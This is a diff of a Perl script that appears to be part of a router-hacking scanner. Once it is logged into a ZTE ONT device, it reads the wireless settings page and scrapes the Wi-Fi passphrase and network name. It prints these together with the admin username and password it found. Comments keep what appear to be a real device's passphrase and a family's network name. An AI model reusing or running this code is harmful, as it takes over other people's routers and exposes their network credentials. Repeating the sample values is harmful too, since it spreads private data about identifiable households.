@@ -648,16 +648,24 @@ else
 				$response = $self->dispatch(url => $url.'getpage.gch?pid=1002&nextpage=net_wlan_basic_t1.gch' ,method => 'GET', headers => $headers);
 				$decoded_response = $response->decoded_content;							
 				$decoded_response =~ s/[^\x00-\x7f]//g;
+				$decoded_response =~ s/\\x2e/./g; 
+				$decoded_response =~ s/\\x20/ /g; 
+
+				# print("imprmit");
+				# open (SALIDA,">iot.html") || die "ERROR: No puedo abrir el fichero google.html\n";
+				# print SALIDA $decoded_response;
+				# close (SALIDA);
+
 				my $KeyPassphrase;
 				#KeyPassphrase','675430or'
 				if ($decoded_response =~ /Transfer_meaning\('KeyPassphrase','(\w+)'\);/) {
 					$KeyPassphrase = $1;					
 				}
 					
-				#'ESSID','CRIS'
+				#<script language=javascript>Transfer_meaning('ESSID','Flia. Saavedra');</script>
 				my $ESSID;
-				if ($decoded_response =~ /Transfer_meaning\('ESSID','(\w+)'\);/) {
-					$ESSID = $1;					
+				while ($decoded_response =~ /<script language=javascript>Transfer_meaning\('ESSID','(.*?)'\);<\/script>/g) {					
+					$ESSID = $1;				
 				}
 			
 				print "Password encontrado: [ZTE ONT-4GE-2VW] $url Usuario:$user Password:$password ESSID $ESSID KeyPassphrase $KeyPassphrase \n";
